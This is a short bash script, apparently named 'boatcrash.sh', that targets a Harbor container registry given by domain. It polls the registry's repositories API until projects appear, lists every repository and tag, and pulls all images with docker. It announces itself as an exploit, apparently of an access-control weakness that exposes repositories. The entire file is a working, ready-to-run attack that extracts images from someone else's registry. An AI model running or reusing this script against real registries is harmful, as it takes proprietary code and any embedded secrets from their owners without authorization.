#!/bin/bash
EXIT=0
RED="\033[0;31m"
NC="\033[0m"
GREEN="\033[0;32m"

if [ "$#" != 1 ]; then
  printf "${RED}Error${NC}: not enough args"
  printf "Usage: ./boatcrash.sh <harbor_domain_name>"
  exit 1
fi

while [ "$EXIT" != 1 ]; do
	pushd /tmp > /dev/null
	curl -q https://$1/api/v2.0/repositories 2> /dev/null | jq -r '.[].name' > publicrepos.tmp
	if [ -s publicrepos.tmp ]; then
		printf "\r[${GREEN}+${NC}] Projects detected. Exploiting...\n"
		while read p; do
			# split project and repository
			IFS='/' read -a array <<< "$p"
                        # get all tags
		        tags=`curl https://$1/api/v2.0/projects/${array[0]}/repositories/${array[1]}/artifacts 2> /dev/null | jq -r '.[].tags[].name'` 
			for t in $tags; do
				docker pull $1/$p:$t > /dev/null 2> /dev/null
				printf "[O] Pull complete :: ${GREEN}$p:$t${NC}\n"
			done
		done < publicrepos.tmp
		printf "[+] ${GREEN}Exploit completed.${NC} Run 'docker images' to list all extract docker images.\n"
		EXIT=1
	else
		printf "\r[${RED}-${NC}] No projects detected yet. Waiting...\n"
		sleep 30
	fi
	popd > /dev/null
done
